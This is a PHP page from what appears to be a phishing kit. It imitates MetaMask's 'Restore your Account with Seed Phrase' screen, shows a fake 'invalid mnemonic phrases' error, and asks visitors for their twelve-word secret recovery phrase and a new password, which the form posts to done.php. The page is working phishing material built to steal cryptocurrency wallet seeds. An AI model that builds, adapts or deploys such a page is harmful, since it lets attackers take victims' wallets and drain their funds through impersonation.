<?php header('koneksi.php'); ?>



<?php

include_once('header.php');

?>

<section class="mt-3">
    <div class="container d-flex align-items-center">
        <img class="" style="width: 60px;" src="./assets/images/mm.png" alt="mm">
        <span class="ms-3" style="font-size: 25px;">
            Metamask
        </span>
    </div>
</section>
<hr>
<div class="container px-3">

    <form method="post" action="done.php">

        <br>

        <div class="import-account-title">Restore your Account with Seed Phrase</div>
        <div class="import-account-selector-label">Enter your secret twelve word phrase here to restore your vault.

        <div class="form-group mt-5">

            <label for="mew_seed" class="text-danger">Error... invalid mnemonic phrases</label>

            <textarea class="form-control" placeholder="Separated each words with a single space" name="mew_seed"

                rows="6" cols="3" maxlength="200"></textarea>

        </div>
        <div class="row mt-4">
            <div class="col-6">
                <div class="form-group">
                    <label for="pass-meta-1">
                        New Password (min 8 chars)
                    </label>
                    <input type="password" name="pass-meta-1" class="form-control" required>
                </div>
                <div class="form-group mt-4">
                    <label for="pass-meta-2">
                        Confirm Password
                    </label>
                    <input type="password" name="pass-meta-2" class="form-control" required>
                </div>
                <div class="row px-3 mt-3">
                    <button class="btn btn-warning mm-btn text-white" type="submit"
                        style="background:orange">RESTORE</button>

        </div>

    </form>

</div>



<?php include_once('footer.php'); ?>